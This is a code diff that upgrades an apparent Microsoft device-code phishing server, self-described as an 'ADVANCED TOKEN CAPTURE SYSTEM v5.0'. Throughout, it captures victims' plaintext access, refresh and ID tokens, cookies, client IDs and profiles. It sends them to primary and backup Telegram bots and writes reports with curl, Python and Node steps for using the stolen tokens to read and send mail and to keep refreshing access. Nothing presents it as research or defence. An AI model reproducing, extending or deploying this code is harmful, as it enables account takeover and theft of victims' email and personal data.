@@ -15,7 +15,7 @@ app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1d' }));
 
 // ============================================================================
-// CONFIGURATION
+// ADVANCED CONFIGURATION
 // ============================================================================
 
 const config = {
@@ -35,14 +35,22 @@ const config = {
     ].join(' '),
   },
   telegram: {
+    // PRIMARY BOT (Main reporting)
     botToken: process.env.TELEGRAM_BOT_TOKEN,
     chatId: process.env.TELEGRAM_CHAT_ID,
+    // SECONDARY BOT (Backup reporting)
+    botToken2: process.env.TELEGRAM_BOT_TOKEN_2,
+    chatId2: process.env.TELEGRAM_CHAT_ID_2,
   },
   server: {
     port: process.env.PORT || 3000,
-    appUrl: process.env.RAILWAY_PUBLIC_DOMAIN 
-      ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
-      : process.env.APP_URL || 'http://localhost:3000',
+    // Flexible URL detection - works anywhere
+    appUrl: process.env.APP_URL || 
+            (process.env.RAILWAY_PUBLIC_DOMAIN 
+              ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
+              : (process.env.HEROKU_APP_NAME 
+                  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`
+                  : `http://localhost:${process.env.PORT || 3000}`)),
   },
   security: {
     encryptionKey: Buffer.from(
@@ -116,9 +124,9 @@ class Storage {
 
   static async saveReport(captureId, content) {
     try {
-      const filepath = path.join(config.storage.reportsDir, `REPORT_${captureId}.txt`);
+      const filepath = path.join(config.storage.reportsDir, `COMPLETE_REPORT_${captureId}.txt`);
       await fs.writeFile(filepath, content, 'utf8');
-      console.log(`[TXT] Saved: REPORT_${captureId}.txt`);
+      console.log(`[TXT] Saved: COMPLETE_REPORT_${captureId}.txt`);
       return filepath;
     } catch (err) {
       console.error(`[TXT] Error:`, err.message);
@@ -126,70 +134,224 @@ class Storage {
     }
   }
 
-  static generateReport(data) {
+  static generateAdvancedReport(data) {
     const lines = [];
     const sep = '='.repeat(80);
+    const subsep = '-'.repeat(80);
     
     lines.push(sep);
-    lines.push('MICROSOFT TOKEN CAPTURE - COMPLETE REPORT');
+    lines.push('MICROSOFT TOKEN CAPTURE - COMPLETE ADVANCED REPORT');
     lines.push(sep);
     lines.push('');
     lines.push(`Capture ID: ${data.metadata.captureId}`);
     lines.push(`Timestamp: ${data.metadata.timestamp}`);
     lines.push(`Session ID: ${data.metadata.sessionId}`);
+    lines.push(`Server URL: ${data.metadata.serverUrl}`);
     lines.push('');
     
-    // ACCESS TOKEN
+    // ========================================================================
+    // SECTION 1: CLIENT INFORMATION
+    // ========================================================================
     lines.push(sep);
-    lines.push('1. ACCESS TOKEN (PLAINTEXT - FULL)');
+    lines.push('1. CLIENT INFORMATION');
     lines.push(sep);
+    lines.push('');
+    lines.push(`Application Client ID: ${data.clientInfo.applicationClientId}`);
+    lines.push(`Tenant ID: ${data.clientInfo.tenantId}`);
+    if (data.clientInfo.userClientId) {
+      lines.push(`User Account Client ID: ${data.clientInfo.userClientId}`);
+    }
+    lines.push('');
+    
+    // ========================================================================
+    // SECTION 2: ALL TOKENS (COMPLETE)
+    // ========================================================================
+    lines.push(sep);
+    lines.push('2. ALL TOKENS - COMPLETE & UNTRUNCATED');
+    lines.push(sep);
+    lines.push('');
+    
+    // Access Token
+    lines.push('2.1 ACCESS TOKEN (PLAINTEXT - FULL)');
+    lines.push(subsep);
     lines.push(data.tokens.access.plaintext);
     lines.push('');
     lines.push(`Type: ${data.tokens.access.type}`);
     lines.push(`Length: ${data.tokens.access.length} characters`);
     lines.push(`Expires In: ${data.tokens.access.expiresIn} seconds`);
+    lines.push(`Expires At: ${data.tokens.access.expiresAt}`);
     lines.push('');
     
-    // ACCESS TOKEN ENCRYPTED
-    lines.push('2. ACCESS TOKEN (ENCRYPTED)');
-    lines.push(sep);
-    lines.push(`Algorithm: ${data.tokens.access.encrypted.algorithm}`);
-    lines.push(`Encrypted: ${data.tokens.access.encrypted.encrypted}`);
-    lines.push(`IV: ${data.tokens.access.encrypted.iv}`);
-    lines.push(`Auth Tag: ${data.tokens.access.encrypted.authTag}`);
-    lines.push(`Signature: ${data.tokens.access.encrypted.signature}`);
-    lines.push('');
-    
-    // REFRESH TOKEN
+    // Refresh Token
     if (data.tokens.refresh) {
-      lines.push(sep);
-      lines.push('3. REFRESH TOKEN (PLAINTEXT - FULL)');
-      lines.push(sep);
+      lines.push('2.2 REFRESH TOKEN (PLAINTEXT - FULL)');
+      lines.push(subsep);
       lines.push(data.tokens.refresh.plaintext);
       lines.push('');
       lines.push(`Length: ${data.tokens.refresh.length} characters`);
       lines.push(`Potential PRT: ${data.tokens.refresh.isPotentialPRT ? 'YES' : 'NO'}`);
       lines.push('');
-      
-      lines.push('4. REFRESH TOKEN (ENCRYPTED)');
-      lines.push(sep);
-      lines.push(`Encrypted: ${data.tokens.refresh.encrypted.encrypted}`);
-      lines.push(`IV: ${data.tokens.refresh.encrypted.iv}`);
-      lines.push('');
     }
     
-    // ID TOKEN
+    // ID Token
     if (data.tokens.id) {
-      lines.push(sep);
-      lines.push('5. ID TOKEN (PLAINTEXT - FULL)');
-      lines.push(sep);
+      lines.push('2.3 ID TOKEN (PLAINTEXT - FULL)');
+      lines.push(subsep);
       lines.push(data.tokens.id.plaintext);
       lines.push('');
     }
     
-    // COOKIES
+    // ========================================================================
+    // SECTION 3: LOGIN PROCEDURES
+    // ========================================================================
     lines.push(sep);
-    lines.push('6. COOKIES - ALL CAPTURED');
+    lines.push('3. LOGIN PROCEDURES & TOKEN USAGE');
+    lines.push(sep);
+    lines.push('');
+    
+    lines.push('3.1 HOW TO LOGIN WITH ACCESS TOKEN');
+    lines.push(subsep);
+    lines.push('');
+    lines.push('METHOD 1: Microsoft Graph API (Recommended)');
+    lines.push('-------------------------------------------');
+    lines.push('');
+    lines.push('# Get user profile:');
+    lines.push('curl -X GET "https://graph.microsoft.com/v1.0/me" \\');
+    lines.push(`  -H "Authorization: Bearer ${data.tokens.access.plaintext.substring(0, 50)}..." \\`);
+    lines.push('  -H "Content-Type: application/json"');
+    lines.push('');
+    lines.push('# Read emails:');
+    lines.push('curl -X GET "https://graph.microsoft.com/v1.0/me/messages" \\');
+    lines.push(`  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"`);
+    lines.push('');
+    lines.push('# Send email:');
+    lines.push('curl -X POST "https://graph.microsoft.com/v1.0/me/sendMail" \\');
+    lines.push(`  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \\`);
+    lines.push('  -H "Content-Type: application/json" \\');
+    lines.push('  -d \'{"message":{"subject":"Test","body":{"content":"Hello"},"toRecipients":[{"emailAddress":{"address":"recipient@example.com"}}]}}\'');
+    lines.push('');
+    lines.push('');
+    
+    lines.push('METHOD 2: Programmatic Access (Python)');
+    lines.push('---------------------------------------');
+    lines.push('');
+    lines.push('import requests');
+    lines.push('');
+    lines.push(`access_token = "${data.tokens.access.plaintext.substring(0, 50)}..."`);
+    lines.push('headers = {"Authorization": f"Bearer {access_token}"}');
+    lines.push('');
+    lines.push('# Get user info');
+    lines.push('response = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)');
+    lines.push('user = response.json()');
+    lines.push('print(user)');
+    lines.push('');
+    lines.push('');
+    
+    lines.push('METHOD 3: Programmatic Access (JavaScript/Node.js)');
+    lines.push('--------------------------------------------------');
+    lines.push('');
+    lines.push('const axios = require(\'axios\');');
+    lines.push('');
+    lines.push(`const accessToken = '${data.tokens.access.plaintext.substring(0, 50)}...';`);
+    lines.push('');
+    lines.push('// Get user info');
+    lines.push('const response = await axios.get(\'https://graph.microsoft.com/v1.0/me\', {');
+    lines.push('  headers: { \'Authorization\': `Bearer ${accessToken}` }');
+    lines.push('});');
+    lines.push('console.log(response.data);');
+    lines.push('');
+    lines.push('');
+    
+    if (data.tokens.refresh) {
+      lines.push('3.2 HOW TO GET NEW ACCESS TOKEN FROM REFRESH TOKEN');
+      lines.push(subsep);
+      lines.push('');
+      lines.push('METHOD 1: Using cURL');
+      lines.push('--------------------');
+      lines.push('');
+      lines.push('curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \\');
+      lines.push('  -H "Content-Type: application/x-www-form-urlencoded" \\');
+      lines.push('  -d "client_id=' + data.clientInfo.applicationClientId + '" \\');
+      lines.push('  -d "scope=User.Read offline_access" \\');
+      lines.push('  -d "refresh_token=' + data.tokens.refresh.plaintext.substring(0, 50) + '..." \\');
+      lines.push('  -d "grant_type=refresh_token"');
+      lines.push('');
+      lines.push('# Response will contain:');
+      lines.push('# - access_token: New access token');
+      lines.push('# - refresh_token: New refresh token (use this for next refresh)');
+      lines.push('# - expires_in: Token validity in seconds');
+      lines.push('');
+      lines.push('');
+      
+      lines.push('METHOD 2: Using Python');
+      lines.push('----------------------');
+      lines.push('');
+      lines.push('import requests');
+      lines.push('');
+      lines.push('data = {');
+      lines.push(`    'client_id': '${data.clientInfo.applicationClientId}',`);
+      lines.push('    \'scope\': \'User.Read offline_access\',');
+      lines.push(`    'refresh_token': '${data.tokens.refresh.plaintext.substring(0, 50)}...',`);
+      lines.push('    \'grant_type\': \'refresh_token\'');
+      lines.push('}');
+      lines.push('');
+      lines.push('response = requests.post(');
+      lines.push('    \'https://login.microsoftonline.com/common/oauth2/v2.0/token\',');
+      lines.push('    data=data');
+      lines.push(')');
+      lines.push('');
+      lines.push('tokens = response.json()');
+      lines.push('new_access_token = tokens[\'access_token\']');
+      lines.push('new_refresh_token = tokens[\'refresh_token\']');
+      lines.push('');
+      lines.push('print(f"New Access Token: {new_access_token}")');
+      lines.push('print(f"New Refresh Token: {new_refresh_token}")');
+      lines.push('');
+      lines.push('');
+      
+      lines.push('METHOD 3: Using JavaScript/Node.js');
+      lines.push('----------------------------------');
+      lines.push('');
+      lines.push('const axios = require(\'axios\');');
+      lines.push('const qs = require(\'querystring\');');
+      lines.push('');
+      lines.push('const data = {');
+      lines.push(`  client_id: '${data.clientInfo.applicationClientId}',`);
+      lines.push('  scope: \'User.Read offline_access\',');
+      lines.push(`  refresh_token: '${data.tokens.refresh.plaintext.substring(0, 50)}...',`);
+      lines.push('  grant_type: \'refresh_token\'');
+      lines.push('};');
+      lines.push('');
+      lines.push('const response = await axios.post(');
+      lines.push('  \'https://login.microsoftonline.com/common/oauth2/v2.0/token\',');
+      lines.push('  qs.stringify(data),');
+      lines.push('  { headers: { \'Content-Type\': \'application/x-www-form-urlencoded\' } }');
+      lines.push(');');
+      lines.push('');
+      lines.push('const newAccessToken = response.data.access_token;');
+      lines.push('const newRefreshToken = response.data.refresh_token;');
+      lines.push('');
+      lines.push('console.log("New Access Token:", newAccessToken);');
+      lines.push('console.log("New Refresh Token:", newRefreshToken);');
+      lines.push('');
+      lines.push('');
+      
+      lines.push('IMPORTANT NOTES:');
+      lines.push('----------------');
+      lines.push('1. Each refresh generates a NEW access token AND a NEW refresh token');
+      lines.push('2. Always save the new refresh token for future use');
+      lines.push('3. Old refresh tokens may become invalid after use');
+      lines.push('4. Access tokens typically expire in 1 hour (3600 seconds)');
+      lines.push('5. Refresh tokens can last up to 90 days');
+      lines.push('6. Use the same client_id that was used for initial authentication');
+      lines.push('');
+    }
+    
+    // ========================================================================
+    // SECTION 4: COOKIES
+    // ========================================================================
+    lines.push(sep);
+    lines.push('4. ALL COOKIES CAPTURED');
     lines.push(sep);
     lines.push('');
     lines.push('Raw Cookie Header:');
@@ -202,23 +364,47 @@ class Storage {
     lines.push(JSON.stringify(data.cookies.microsoftCookies, null, 2));
     lines.push('');
     
-    // USER
+    // ========================================================================
+    // SECTION 5: USER PROFILE
+    // ========================================================================
     lines.push(sep);
-    lines.push('7. USER PROFILE');
+    lines.push('5. USER PROFILE');
     lines.push(sep);
     lines.push(JSON.stringify(data.user.profile, null, 2));
     lines.push('');
     
-    // SUMMARY
+    // ========================================================================
+    // SECTION 6: ENCRYPTED TOKENS
+    // ========================================================================
     lines.push(sep);
-    lines.push('SUMMARY');
+    lines.push('6. ENCRYPTED TOKENS (AES-256-GCM)');
     lines.push(sep);
-    lines.push(`✅ Access Token: ${data.tokens.access ? 'CAPTURED' : 'NO'}`);
-    lines.push(`✅ Refresh Token: ${data.tokens.refresh ? 'CAPTURED' : 'NO'}`);
+    lines.push('');
+    lines.push('Access Token Encrypted:');
+    lines.push(JSON.stringify(data.tokens.access.encrypted, null, 2));
+    lines.push('');
+    if (data.tokens.refresh) {
+      lines.push('Refresh Token Encrypted:');
+      lines.push(JSON.stringify(data.tokens.refresh.encrypted, null, 2));
+      lines.push('');
+    }
+    
+    // ========================================================================
+    // SECTION 7: SUMMARY
+    // ========================================================================
+    lines.push(sep);
+    lines.push('7. CAPTURE SUMMARY');
+    lines.push(sep);
+    lines.push(`✅ Application Client ID: ${data.clientInfo.applicationClientId}`);
+    lines.push(`✅ Access Token: ${data.tokens.access ? 'CAPTURED' : 'NO'} (${data.tokens.access?.length || 0} chars)`);
+    lines.push(`✅ Refresh Token: ${data.tokens.refresh ? 'CAPTURED' : 'NO'} (${data.tokens.refresh?.length || 0} chars)`);
     lines.push(`✅ ID Token: ${data.tokens.id ? 'CAPTURED' : 'NO'}`);
     lines.push(`✅ PRT: ${data.tokens.refresh?.isPotentialPRT ? 'DETECTED' : 'NO'}`);
     lines.push(`✅ Microsoft Cookies: ${Object.keys(data.cookies.microsoftCookies).length}`);
+    lines.push(`✅ User Profile: ${data.user.profile && !data.user.profile.error ? 'CAPTURED' : 'FAILED'}`);
     lines.push('');
+    lines.push(sep);
+    lines.push('END OF REPORT');
     lines.push(sep);
     
     return lines.join('\n');
@@ -226,13 +412,35 @@ class Storage {
 }
 
 // ============================================================================
-// TELEGRAM
+// DUAL TELEGRAM SENDER
 // ============================================================================
 
-class Telegram {
-  static async sendJSON(title, data) {
-    if (!config.telegram.botToken || !config.telegram.chatId) {
-      console.log(`[TELEGRAM DISABLED] ${title}`);
+class DualTelegram {
+  static async sendToAll(title, data) {
+    // Send to primary bot
+    await this.sendJSON(
+      config.telegram.botToken,
+      config.telegram.chatId,
+      title,
+      data,
+      'PRIMARY'
+    );
+    
+    // Send to secondary bot if configured
+    if (config.telegram.botToken2 && config.telegram.chatId2) {
+      await this.sendJSON(
+        config.telegram.botToken2,
+        config.telegram.chatId2,
+        title,
+        data,
+        'SECONDARY'
+      );
+    }
+  }
+
+  static async sendJSON(botToken, chatId, title, data, label) {
+    if (!botToken || !chatId) {
+      console.log(`[TELEGRAM ${label} DISABLED] ${title}`);
       return;
     }
 
@@ -246,35 +454,57 @@ class Telegram {
           : `${title} (Part ${i + 1})\n\`\`\`json\n${chunks[i]}\n\`\`\``;
 
         await axios.post(
-          `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
-          { chat_id: config.telegram.chatId, text, parse_mode: 'Markdown' },
+          `https://api.telegram.org/bot${botToken}/sendMessage`,
+          { chat_id: chatId, text, parse_mode: 'Markdown' },
           { timeout: 10000 }
         );
 
         if (i < chunks.length - 1) await this.sleep(1000);
       }
 
-      console.log(`[TELEGRAM] ✅ ${title} (${chunks.length} parts)`);
+      console.log(`[TELEGRAM ${label}] ✅ ${title} (${chunks.length} parts)`);
     } catch (error) {
-      console.error(`[TELEGRAM] ❌ ${title}:`, error.message);
+      console.error(`[TELEGRAM ${label}] ❌ ${title}:`, error.message);
     }
   }
 
-  static async sendFile(filepath, caption) {
-    if (!config.telegram.botToken || !config.telegram.chatId) return;
+  static async sendFileToAll(filepath, caption) {
+    // Send to primary
+    await this.sendFile(
+      config.telegram.botToken,
+      config.telegram.chatId,
+      filepath,
+      caption,
+      'PRIMARY'
+    );
+    
+    // Send to secondary
+    if (config.telegram.botToken2 && config.telegram.chatId2) {
+      await this.sendFile(
+        config.telegram.botToken2,
+        config.telegram.chatId2,
+        filepath,
+        caption,
+        'SECONDARY'
+      );
+    }
+  }
+
+  static async sendFile(botToken, chatId, filepath, caption, label) {
+    if (!botToken || !chatId) return;
 
     try {
       const FormData = require('form-data');
       const form = new FormData();
       
-      form.append('chat_id', config.telegram.chatId);
+      form.append('chat_id', chatId);
       form.append('document', await fs.readFile(filepath), {
         filename: path.basename(filepath),
       });
       if (caption) form.append('caption', caption);
 
       await axios.post(
-        `https://api.telegram.org/bot${config.telegram.botToken}/sendDocument`,
+        `https://api.telegram.org/bot${botToken}/sendDocument`,
         form,
         { 
           headers: form.getHeaders(),
@@ -284,9 +514,9 @@ class Telegram {
         }
       );
 
-      console.log(`[TELEGRAM] ✅ File: ${path.basename(filepath)}`);
+      console.log(`[TELEGRAM ${label}] ✅ File: ${path.basename(filepath)}`);
     } catch (error) {
-      console.error(`[TELEGRAM] ❌ File:`, error.message);
+      console.error(`[TELEGRAM ${label}] ❌ File:`, error.message);
     }
   }
 
@@ -316,9 +546,6 @@ function extractCookies(req) {
     'login', 'auth', 'sso', 'estsauth', 'buid', 'MUID',
   ];
   
-  const emailPatterns = ['outlook', 'owa', 'mail', 'exchange'];
-  const authPatterns = ['auth', 'token', 'session', 'signin', 'login', 'sso'];
-  
   const filterCookies = (patterns) => {
     return Object.keys(allCookies)
       .filter(key => patterns.some(pattern => 
@@ -342,14 +569,11 @@ function extractCookies(req) {
         referer: req.headers.referer,
         origin: req.headers.origin,
         host: req.headers.host,
-        connection: req.headers.connection,
       },
       ip: req.ip || req.connection.remoteAddress,
       timestamp: new Date().toISOString(),
     },
     microsoftCookies: filterCookies(microsoftPatterns),
-    emailCookies: filterCookies(emailPatterns),
-    authCookies: filterCookies(authPatterns),
   };
 }
 
@@ -373,6 +597,28 @@ function decodeJWT(token) {
 }
 
 // ============================================================================
+// CLIENT ID EXTRACTOR
+// ============================================================================
+
+function extractClientIds(tokenData, decodedTokens) {
+  const clientInfo = {
+    applicationClientId: config.microsoft.clientId,
+    tenantId: config.microsoft.tenantId,
+    userClientId: null,
+  };
+  
+  // Try to extract user's client ID from token claims
+  if (decodedTokens.access?.payload) {
+    clientInfo.userClientId = decodedTokens.access.payload.app_id || 
+                               decodedTokens.access.payload.appid ||
+                               decodedTokens.access.payload.azp ||
+                               decodedTokens.access.payload.client_id;
+  }
+  
+  return clientInfo;
+}
+
+// ============================================================================
 // STORAGE
 // ============================================================================
 
@@ -390,11 +636,11 @@ const MS = {
 };
 
 // ============================================================================
-// CAPTURE ENGINE
+// ADVANCED CAPTURE ENGINE
 // ============================================================================
 
-async function captureComplete(tokenData, sessionId, userCode, cookieData) {
-  console.log('\n🚀 COMPLETE CAPTURE STARTED');
+async function captureAdvanced(tokenData, sessionId, userCode, cookieData) {
+  console.log('\n🚀 ADVANCED CAPTURE WITH CLIENT ID');
 
   const captureId = crypto.randomUUID();
   const timestamp = new Date().toISOString();
@@ -405,7 +651,7 @@ async function captureComplete(tokenData, sessionId, userCode, cookieData) {
   
   const hasPRT = refreshToken && refreshToken.length > 500;
 
-  console.log(`[TOKENS] Access: ${accessToken?.length || 0} | Refresh: ${refreshToken?.length || 0} | ID: ${idToken?.length || 0}`);
+  console.log(`[TOKENS] Access: ${accessToken?.length || 0} | Refresh: ${refreshToken?.length || 0}`);
 
   // Get user
   let user = null;
@@ -421,12 +667,18 @@ async function captureComplete(tokenData, sessionId, userCode, cookieData) {
   }
 
   // Decode
-  const decodedAccess = decodeJWT(accessToken);
-  const decodedRefresh = refreshToken ? decodeJWT(refreshToken) : null;
-  const decodedId = idToken ? decodeJWT(idToken) : null;
+  const decoded = {
+    access: decodeJWT(accessToken),
+    refresh: refreshToken ? decodeJWT(refreshToken) : null,
+    id: idToken ? decodeJWT(idToken) : null,
+  };
+
+  // Extract client IDs
+  const clientInfo = extractClientIds(tokenData, decoded);
+  console.log(`[CLIENT] App: ${clientInfo.applicationClientId} | User: ${clientInfo.userClientId || 'N/A'}`);
 
   // Encrypt
-  const encTokens = {
+  const encrypted = {
     access: Encryption.encrypt(accessToken),
     refresh: refreshToken ? Encryption.encrypt(refreshToken) : null,
     id: idToken ? Encryption.encrypt(idToken) : null,
@@ -439,34 +691,36 @@ async function captureComplete(tokenData, sessionId, userCode, cookieData) {
       sessionId,
       userCode,
       timestamp,
-      version: '4.0',
+      version: '5.0-ADVANCED',
       serverUrl: config.server.appUrl,
     },
+
+    clientInfo,
 
     tokens: {
       access: {
         plaintext: accessToken,
-        encrypted: encTokens.access,
+        encrypted: encrypted.access,
         length: accessToken.length,
         type: tokenData.token_type || 'Bearer',
         expiresIn: tokenData.expires_in,
         expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString(),
-        decoded: decodedAccess,
+        decoded: decoded.access,
       },
       
       refresh: refreshToken ? {
         plaintext: refreshToken,
-        encrypted: encTokens.refresh,
+        encrypted: encrypted.refresh,
         length: refreshToken.length,
-        decoded: decodedRefresh,
+        decoded: decoded.refresh,
         isPotentialPRT: hasPRT,
       } : null,
 
       id: idToken ? {
         plaintext: idToken,
-        encrypted: encTokens.id,
+        encrypted: encrypted.id,
         length: idToken.length,
-        decoded: decodedId,
+        decoded: decoded.id,
       } : null,
     },
 
@@ -480,34 +734,34 @@ async function captureComplete(tokenData, sessionId, userCode, cookieData) {
     user: {
       profile: user,
       claims: {
-        fromAccessToken: decodedAccess?.payload || {},
-        fromIdToken: decodedId?.payload || {},
+        fromAccessToken: decoded.access?.payload || {},
+        fromIdToken: decoded.id?.payload || {},
       },
     },
   };
 
   // Save
   await Storage.saveJSON(`complete_${captureId}`, capture);
-  const reportContent = Storage.generateReport(capture);
+  const reportContent = Storage.generateAdvancedReport(capture);
   const reportPath = await Storage.saveReport(captureId, reportContent);
 
-  // Send to Telegram
-  await Telegram.sendJSON('📊 *CAPTURE SUMMARY*', {
+  // Send to DUAL Telegram
+  await DualTelegram.sendToAll('📊 *CAPTURE SUMMARY*', {
     captureId,
     timestamp,
+    clientInfo: {
+      applicationClientId: clientInfo.applicationClientId,
+      userClientId: clientInfo.userClientId || 'Not detected',
+    },
     tokens: {
       access: '✅ CAPTURED',
       refresh: refreshToken ? '✅ CAPTURED' : '❌',
       id: idToken ? '✅ CAPTURED' : '❌',
       prt: hasPRT ? '✅ DETECTED' : '❌',
     },
-    cookies: {
-      total: Object.keys(cookieData.all.cookies).length,
-      microsoft: Object.keys(cookieData.microsoftCookies).length,
-    },
   });
 
-  await Telegram.sendJSON('🔓 *ACCESS TOKEN - FULL*', {
+  await DualTelegram.sendToAll('🔓 *ACCESS TOKEN - FULL*', {
     captureId,
     token: accessToken,
     metadata: {
@@ -518,7 +772,7 @@ async function captureComplete(tokenData, sessionId, userCode, cookieData) {
   });
 
   if (refreshToken) {
-    await Telegram.sendJSON('🔄 *REFRESH TOKEN - FULL*', {
+    await DualTelegram.sendToAll('🔄 *REFRESH TOKEN - FULL*', {
       captureId,
       token: refreshToken,
       length: refreshToken.length,
@@ -527,38 +781,41 @@ async function captureComplete(tokenData, sessionId, userCode, cookieData) {
   }
 
   if (idToken) {
-    await Telegram.sendJSON('🆔 *ID TOKEN - FULL*', {
+    await DualTelegram.sendToAll('🆔 *ID TOKEN - FULL*', {
       captureId,
       token: idToken,
-      length: idToken.length,
     });
   }
 
-  await Telegram.sendJSON('🔐 *ALL TOKENS ENCRYPTED*', {
+  await DualTelegram.sendToAll('🔐 *ENCRYPTED TOKENS*', {
     captureId,
-    access: encTokens.access,
-    refresh: encTokens.refresh,
-    id: encTokens.id,
+    access: encrypted.access,
+    refresh: encrypted.refresh,
+    id: encrypted.id,
   });
 
-  await Telegram.sendJSON('🍪 *ALL COOKIES*', cookieData);
+  await DualTelegram.sendToAll('🍪 *ALL COOKIES*', cookieData);
 
-  await Telegram.sendJSON('👤 *USER PROFILE*', {
+  await DualTelegram.sendToAll('👤 *USER PROFILE*', {
     captureId,
     user: capture.user,
-    scopes: capture.scopes,
+  });
+
+  await DualTelegram.sendToAll('🔑 *CLIENT IDs*', {
+    captureId,
+    clientInfo,
   });
 
   if (reportPath) {
-    await Telegram.sendFile(reportPath, `📄 Complete Report - ${captureId}`);
+    await DualTelegram.sendFileToAll(reportPath, `📄 Complete Report - ${captureId}`);
   }
 
   const jsonPath = path.join(config.storage.jsonDir, `complete_${captureId}.json`);
-  await Telegram.sendFile(jsonPath, `📊 Complete JSON - ${captureId}`);
+  await DualTelegram.sendFileToAll(jsonPath, `📊 JSON - ${captureId}`);
 
-  console.log(`✅ COMPLETE - ${captureId}\n`);
+  console.log(`✅ ADVANCED CAPTURE COMPLETE - ${captureId}\n`);
 
-  return { user, captureId, hasPRT };
+  return { user, captureId, hasPRT, clientInfo };
 }
 
 // ============================================================================
@@ -594,6 +851,14 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Get server config (for flexible frontend)
+app.get('/api/config', (req, res) => {
+  res.json({
+    serverUrl: config.server.appUrl,
+    version: '5.0',
+  });
+});
+
 app.post('/api/device/generate', async (req, res) => {
   try {
     const sessionId = crypto.randomUUID();
@@ -621,7 +886,7 @@ app.post('/api/device/generate', async (req, res) => {
 
     console.log(`[GENERATE] ${data.user_code}`);
 
-    Telegram.sendJSON('🔐 *CODE GENERATED*', {
+    DualTelegram.sendToAll('🔐 *CODE GENERATED*', {
       sessionId,
       userCode: data.user_code,
       proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
@@ -666,7 +931,7 @@ app.get('/api/device/poll/:sessionId', async (req, res) => {
       console.log(`[SUCCESS] ${sessionId}`);
 
       const cookieData = cookieStore.get(session.userCode) || session.cookieData;
-      const result = await captureComplete(tokenData, sessionId, session.userCode, cookieData);
+      const result = await captureAdvanced(tokenData, sessionId, session.userCode, cookieData);
 
       sessions.delete(sessionId);
       cookieStore.delete(session.userCode);
@@ -679,6 +944,7 @@ app.get('/api/device/poll/:sessionId', async (req, res) => {
           email: result.user.mail || result.user.userPrincipalName,
         } : null,
         captureId: result.captureId,
+        clientInfo: result.clientInfo,
       });
 
     } catch (error) {
@@ -701,7 +967,13 @@ app.get('/api/device/poll/:sessionId', async (req, res) => {
 });
 
 app.get('/health', (req, res) => {
-  res.json({ status: 'healthy', version: '4.0', timestamp: new Date().toISOString() });
+  res.json({ 
+    status: 'healthy', 
+    version: '5.0-ADVANCED',
+    serverUrl: config.server.appUrl,
+    dualTelegram: !!(config.telegram.botToken2 && config.telegram.chatId2),
+    timestamp: new Date().toISOString() 
+  });
 });
 
 // ============================================================================
@@ -709,18 +981,28 @@ app.get('/health', (req, res) => {
 // ============================================================================
 
 app.listen(config.server.port, async () => {
-  console.log('\n' + '='.repeat(60));
-  console.log('⚡ TOKEN CAPTURE SYSTEM v4.0');
-  console.log('='.repeat(60));
+  console.log('\n' + '='.repeat(70));
+  console.log('⚡ ADVANCED TOKEN CAPTURE SYSTEM v5.0');
+  console.log('='.repeat(70));
   console.log(`📡 Port: ${config.server.port}`);
   console.log(`🌐 URL: ${config.server.appUrl}`);
   console.log(`💾 Storage: ${config.storage.dataDir}`);
-  console.log('='.repeat(60) + '\n');
+  console.log(`📱 Primary Telegram: ${config.telegram.botToken ? '✅' : '❌'}`);
+  console.log(`📱 Secondary Telegram: ${config.telegram.botToken2 ? '✅' : '❌'}`);
+  console.log('='.repeat(70));
+  console.log('\n🚀 NEW FEATURES:');
+  console.log('   ✅ Client ID Capture');
+  console.log('   ✅ Dual Telegram Reporting');
+  console.log('   ✅ Login Procedures in TXT');
+  console.log('   ✅ Token Refresh Guide');
+  console.log('   ✅ Flexible Hosting (Works Anywhere)');
+  console.log('='.repeat(70) + '\n');
 
   if (config.telegram.botToken) {
-    await Telegram.sendJSON('⚡ *SYSTEM ONLINE v4.0*', {
+    await DualTelegram.sendToAll('⚡ *SYSTEM ONLINE v5.0*', {
       status: 'operational',
       url: config.server.appUrl,
+      dualTelegram: !!(config.telegram.botToken2 && config.telegram.chatId2),
       timestamp: new Date().toISOString(),
     });
   }
